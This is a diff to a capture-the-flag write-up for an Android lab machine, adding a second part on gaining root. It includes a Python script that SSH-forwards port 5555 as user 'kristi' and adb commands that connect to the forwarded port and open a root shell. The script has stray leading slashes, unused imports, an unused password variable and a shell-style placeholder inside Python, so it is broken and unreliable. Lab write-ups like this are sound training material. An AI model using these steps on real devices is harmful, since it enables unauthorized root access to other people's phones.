@@ -2,8 +2,10 @@
 OS: Android
 IP: 10.10.10.247
 
+## Part 1 
+
 ### Skills learned:
-ssh port forwarding
+Curl/Python
 Andriod OS + tools
 
 ### Enum
@@ -45,3 +47,47 @@ uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybo
 
 ### Find Flag
 Have fun searching! 
+
+## Part 2
+
+### Skills learned
+ssh port forwarding
+adb tool
+
+### Install tools:
+adroid-tools-adb
+
+### Port forwarding script.py:
+/import socket # socket
+/import subprocess  # Subprocess
+/import pyautogui  # PyAutoGui
+/import time  # Time
+/
+/def connection_function(host, port):
+/    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+/    s.connect((host, port))
+/    print(s.recv(1024))
+/
+/connection_function("${IP}", 2222)
+/
+/def adb_connection(host, port):
+/    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+/    s.connect((host, port))
+/    print(s.recv(1024))
+/
+/    subprocess.call(['ssh -p 2222 -L 5555:localhost:5555 kristi@${IP}'], shell=True)
+/    password = "[PASSWORD OF TARGET MACHINE OF SSH]"
+/    print(s.recv(1024))
+/   
+/adb_connection("${IP}", 2222)
+
+### Start port-forwarding server
++ adb start-server
++ adb connect localhost:5555
++ adb devices
+
+### Initiate root shell:
++ adb -s localhost:5555 shell
+
+### Find root Flag!
+Happy searching!
